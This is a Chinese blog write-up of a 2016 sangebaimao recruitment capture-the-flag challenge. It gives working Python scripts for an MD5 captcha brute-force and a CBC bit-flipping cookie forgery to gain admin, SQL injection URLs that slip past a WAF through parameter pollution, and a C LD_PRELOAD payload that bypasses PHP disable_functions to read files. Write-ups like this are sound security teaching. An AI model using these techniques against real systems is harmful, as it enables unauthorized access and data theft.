---
title: sangebaimao之招聘又开始了，你怕了吗？
date: 2016-06-17 15:41:39
tags:
- php
- sangebaimao
- 参数污染
- CBC
- c
- LD_PRELOAD
categories:
- Blogs
---

招聘又开始了，又要被火日师傅虐了，运气不错，赶在考试期间还把题目做出来了，遇到了特别神秘的参数污染，还是ll大法无敌...

<!--more-->

# md5碰撞？ #

这个类似于验证码的东西已经用了很久了，不知道最早是不是火日师傅出的，但是没想到还有人不知道怎么过这个验证码，就把脚本贴上来吧。

```
import random
import hashlib

def crack_code(code):
	str = 10000

	while 1:
		m2 = hashlib.md5()   
		m2.update(repr(str))
		if (m2.hexdigest()[0:4]==code):
			return str
			break
		str+=1

def main():
	print crack_code('338f')

if __name__ == '__main__':
    main()
```

有兴趣可以自己去改改。

# cbc字节反转攻击 #


仔细阅读源码可以发现应该第一步的目的是要登陆admin进去，关键在于这个文件

```encrypt.php
<?php
$pass="test";
function encrypt( $string ) {
	$algorithm = 'rijndael-128';
	$key = md5($pass, true);
	$iv_length = mcrypt_get_iv_size( $algorithm, MCRYPT_MODE_CBC );
	$iv = mcrypt_create_iv( $iv_length, MCRYPT_RAND );
	$encrypted = mcrypt_encrypt( $algorithm, $key, $string, MCRYPT_MODE_CBC, $iv );
	$result = base64url_encode( $iv . $encrypted );
	return $result;
}

function decrypt( $string ) {
	$algorithm =  'rijndael-128';
	$key = md5($pass, true );
	$iv_length = mcrypt_get_iv_size( $algorithm, MCRYPT_MODE_CBC );
	$string = base64url_decode( $string );
	$iv = substr( $string, 0, $iv_length );
	$encrypted = substr( $string, $iv_length );
	$result = mcrypt_decrypt( $algorithm, $key, $encrypted, MCRYPT_MODE_CBC, $iv );	
	$result = rtrim($result, "\0");
	if (!preg_match("/^\w+$/",$result)) {
		$result="";
	}
	return $result;
}



function base64url_encode($data) { 
	return rtrim(strtr(base64_encode($data), '+/', '-_'), '='); 
} 

function base64url_decode($data) { 
	return base64_decode(str_pad(strtr($data, '-_', '+/'), strlen($data) % 4, '=', STR_PAD_RIGHT)); 
} 


?>
```

在登陆的时候会把username   encrypt之后放入username，username中的数据是被base64url_decode过的，其中数据应该是32位的，前16位是加密解密用到的位移iv。


## 跑内容 ##
那么如果我们注册一个差不多的用于，比如cdmin，然后爆破第17个字节，就有可能解出admin来。

下面的脚本是跑17、18的脚本。。。被ban了很多次才跑出来。。。

```

# coding=utf-8

import requests
import random
import hashlib
import base64
import time

s = requests.Session()

url="http://451bf8ea3268360ee.jie.sangebaimao.com/admin/index.php"


def encode():
	pass

def test():	
	
	dd = "01234567890abcdef"
	for i in dd[::-1]:
		for j in dd[::-1]:
			for k in dd:
				for l in dd:
					data = "b2c92e25b9aecf7da3172573362db773"+i+j+k+l+"62c5ed122de5011c302efb95bafa"
					data = base64.b64encode(data.decode('hex')).replace('=','').replace('+','-').replace('/','_').replace('\n','')
					# cookies = {"username":data,"path":"/admin/","domain":"451bf8ea3268360ee.jie.sangebaimao.com"}
					headers = {"Cookie": "username="+data+"; captcha=od8lgg6f7i71q16j9rd7p7j9a2; username="+data}
					r = s.get(url,headers = headers)
					# print r.text.encode('utf-8').__len__()
					if((r.text.encode('utf-8').__len__()!=29)&(r.text.encode('utf-8').__len__()!=2262)):
						print data+"  "+repr(r.text.encode('utf-8').__len__())+"   "+repr(r.text.encode('utf-8'))



def main():
	# cookies = {"username":get_username()}
	test()

if __name__ == '__main__':
    main()

```

嗯。。忘记是不是这个脚本。。。有兴趣可以改改看。。。


## 跑iv ##

比赛结束了问aklis司机，他告诉我，他是跑iv出来的，而且跑了一个字节就跑出来了...

贴上脚本
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests

URL = 'http://451bf8ea3268360ee.jie.sangebaimao.com/admin/'

def mb64dec(s):
  return s.replace('-','+').replace('_','/').decode('base64')
def mb64enc(s):
  return s.encode('base64').replace('+','-').replace('/','_').replace('\n','').replace('=', '')

encrypted = mb64dec('h3uBfhqPusSYJ5NwxplV3I44UYHc4eR6O97MpNAp0BE==') # 1dmin


for i in xrange(256):
    cookie = mb64enc(chr(i) + encrypted[1:])
    res = requests.get(URL, cookies={'username': cookie}).text
    print i, cookie, len(res)
    if(len(repr(res))!=2163 and len(res)!= 29):
        print res.encode('utf-8')
```

## cbc攻击 ##

后来Hcamael大佬告诉我这个是googlectf出过，cbc第一个字节异或就可以了，可以伪造任意值。。。。害怕

[wooyun也有这个的文章](http://drops.wooyun.org/tips/7828)
[Hcamael的博客](http://0x48.pw/2016/05/03/0x1A/)

我们先用ddmin注册一个账号，登陆获得username的cookie，然后拿iv的第一个字节和'd'和'a'异或，然后拼接回去，就是admin的cookie，理论上可以伪造任意值



```
#!/usr/bin/env python
#-*- coding:utf-8 -*-

import requests
import hashlib
import base64
import re

def fuck_captcha(s):
	for x in xrange(0, 10000000):
		y = hashlib.md5(str(x)).hexdigest()
		if y[:4] == s:
			return str(x)
	print "God personality.(%s)" %s
	exit(1)


url = "http://451bf8ea3268360ee.jie.sangebaimao.com/login.php"
url2 = "http://451bf8ea3268360ee.jie.sangebaimao.com"

req = requests.get(url)

c = req.headers['Set-Cookie'].split(";")[0]
c = c.split("=")
cookie = {c[0]: c[1]}

cap = re.findall("=([a-f0-9]{4})", req.content)[0]
captcha = fuck_captcha(cap)

data = {"username": "ddmin", "password": "ddog", "captcha": captcha}
req = requests.post(url, data=data, cookies=cookie, allow_redirects=False)

c = req.headers['Set-Cookie']

user = c.split("=")[1]

u = user.replace("-", "+").replace("_", "/")
u += "=" * (len(u) % 4)

de = base64.b64decode(u)
de2 = chr(ord(de[0]) ^ ord('d') ^ ord('a')) + de[1:]

en = base64.b64encode(de2).replace("+", "-").replace("/", "_").replace("=", "")
# cookie = {"username": en}
# req = requests.get(url, cookies=cookie)
print en
# 输出的en为admin的cookie
```
# 参数污染过waf #

仔细分析源码可以发现一个很重要的问题。

在waf中，我们很明显看到处理了4个部分
```
wafArr($_GET);
wafArr($_POST);
wafArr($_COOKIE);
wafArr($_SESSION);

```

但是在user.php中，能发现从$_request['id']获取数据进入sql语句

```
$sql="select * from user where id=".$_REQUEST["id"].";";
$result=query($sql);
```

## 多问号过waf ##
我现在构造的语句是
`id=1&id=4%20and?=2&id=3`

让我们来看看在不同位置的输出是什么

先看waf处
![](/img/sangebaimao/zhao/1.png)
![](/img/sangebaimao/zhao/2.png)

能看到只处理了最后的id，应该是参数被覆盖了

然后是从$_REQUEST中获取的参数
![](/img/sangebaimao/zhao/3.png)
![](/img/sangebaimao/zhao/4.png)

发现有2个，并没有后面的

然后是处理之前
![](/img/sangebaimao/zhao/5.png)
![](/img/sangebaimao/zhao/6.png)

最后看$_REQUEST['id']

![](/img/sangebaimao/zhao/7.png)
![](/img/sangebaimao/zhao/8.png)

发现进入查询语句了，感觉还是挺神奇的



## #过waf ##

结束比赛后，讨论的时候发现有很多方法，第一种就是用#过。

如果传入
```
/admin/user.php/#?id=-1/**/SQL/**/QUERY
```
在处理时，#一般作为位置的标志符，是不会代入$_GET的，但是在$_REQUEST处理url的时候?后会被处理，这样，就会代入查询，形成注入

## 空格过waf ##

因为$_get变量处理同名参数是后面的覆盖前面的，但是这里重写$_REQUEST的时候却是用?,&,=分割的，只要绕过这个分割就可以

```
/admin/user.php?id=-1/**/SQL/**/QUERY&%20id=1 
```
通过空格绕过了检查，只处理了后面的


# 利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令 #

[文章原址](http://drops.wooyun.org/tips/16054)


上一部注入没得到什么有效的信息只有一个提示

```
http://451bf8ea3268360ee.jie.sangebaimao.com/admin/user.php?id=1&id=-1/**/union/**/select/**/1,2,3,(select/**/content/**/from/**/memo),5?=2&id=3


/NQTGmhlG3im8PUcsO2GgMCieThLtbqi4.php
password:firesun
flag is at /.

```

shell的功能很少，尝试发现可以写一个文件进去， move_uploaded_file() 没有被ban，可以写文件，测试了下发现上次遇到的那种方式居然可以，那么写c然后读文件>/tmp/xxx，get flag

不过感觉应该是非预期...才出完没多久就又出了一次。。。


附上c脚本
```
#include<stdlib.h>
#include<stdio.h>
#include<string.h>
#include<dirent.h>

void payload() {
	FILE *fp, *fp2;
	char buf[100];
	// dir = opendir("/");
	fp = fopen("/tmp/ddog123", "w");
	fp2 = fopen("/flag_gei_ni_ni_Ye_du_bu_LIAO", "r");
	fgets(buf, 100, fp2);
	fputs(buf, fp);
	// while ((dp = readdir(dir)) != NULL) {
		// fputs(dp->d_name, fp);
	// }
	fclose(fp);
	fclose(fp2);
	// closedir(dir);
}

int geteuid() {
	if (getenv("LD_PRELOAD") == NULL) {
		return 0;
	}
	unsetenv("LD_PRELOAD");
	payload();
}
```